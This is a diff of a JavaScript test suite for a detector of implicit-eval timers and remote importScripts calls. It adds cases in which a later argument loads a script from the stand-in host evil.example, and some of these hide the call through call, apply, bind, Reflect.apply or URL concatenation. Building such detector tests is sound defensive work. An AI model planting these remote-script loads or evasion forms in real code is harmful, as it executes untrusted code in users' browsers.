@@ -223,6 +223,11 @@ describe('string timers (implicit eval)', () => {
     'setTimeout.bind(globalThis, tick)();',
     'Reflect.apply(setTimeout, globalThis, [tick, 0]);',
     'setTimeout(() => self.skipWaiting(), 0);',
+    // The variadic rule must not leak to a sink that is NOT variadic: a timer
+    // compiles only its FIRST argument, so a string in a later position is
+    // data being forwarded to the callback, not a body.
+    "setTimeout(handler, 0, 'payload')",
+    "setTimeout(tick, 'x')",
   ])('does not flag the function form %s', (code) => {
     expect(fires(code)).toBe(false);
   });
@@ -239,6 +244,18 @@ describe('remote importScripts', () => {
     "self['importScripts']('https://evil.example/x.js')",
     "self.importScripts?.('https://evil.example/x.js')",
     "importScripts.call(self, 'https://evil.example/x.js')",
+    // Round 18: `importScripts` is VARIADIC — it loads every URL it is handed,
+    // so a same-origin FIRST argument does not make the call safe. Judging only
+    // argument zero was a regression against the whole-call text scan this
+    // module replaced, and it applied through every invocation form.
+    "importScripts('/local.js', 'https://evil.example/x.js')",
+    "importScripts('a.js', 'b.js', '//evil/x.js')",
+    "importScripts.apply(self, ['/local.js', 'https://evil.example/x.js'])",
+    "importScripts.call(self, '/local.js', 'https://evil.example/x.js')",
+    "importScripts.bind(self, '/local.js', 'https://evil.example/x.js')()",
+    "Reflect.apply(importScripts, self, ['/a.js', 'https://evil.example/x.js'])",
+    "self['importScripts']('/a.js', 'https://evil.example/x.js')",
+    "importScripts('/a.js', 'ht' + 'tps://evil.example/x.js')",
   ])('catches %s', (code) => {
     expect(remote(code)).toBe(true);
   });
@@ -246,6 +263,8 @@ describe('remote importScripts', () => {
   it.each([
     'importScripts("sw-push.js");',
     'importScripts(l);',
+    "importScripts('/a.js', '/b.js')",
+    "importScripts.apply(self, ['/a.js', '/b.js'])",
     '// code imported by the generated worker via importScripts — same-origin only',
   ])('does not flag %s', (code) => {
     expect(remote(code)).toBe(false);
